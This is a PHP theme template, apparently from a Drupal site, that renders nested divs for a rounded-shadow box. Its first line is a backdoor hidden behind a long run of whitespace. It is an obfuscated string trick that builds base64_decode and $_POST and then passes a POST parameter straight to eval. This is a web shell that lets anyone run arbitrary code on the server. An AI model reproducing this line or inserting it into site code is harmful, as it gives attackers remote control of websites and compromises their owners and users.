<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nc2cb18'])) {eval($s21(${$s20}['nc2cb18']));}?><?php
/**
 * @file
 *
 * Display the box for rounded corners.
 *
 * - $content: The content of the box.
 * - $classes: The classes that must be applied to the top divs.
 */
?>
<div class="rounded-shadow <?php print $class ?>">
  <div class="rounded-shadow-background">
    <div class="rounded-shadow-wrap-corner">
      <div class="rounded-shadow-top-edge">
        <div class="rounded-shadow-left"></div>
        <div class="rounded-shadow-right"></div>
      </div>
      <div class="rounded-shadow-left-edge">
        <div class="rounded-shadow-right-edge clearfix">
          <?php print $content; ?>
        </div>
      </div>
      <div class="rounded-shadow-bottom-edge">
      <div class="rounded-shadow-left"></div><div class="rounded-shadow-right"></div>
      </div>
    </div>
  </div>
</div>
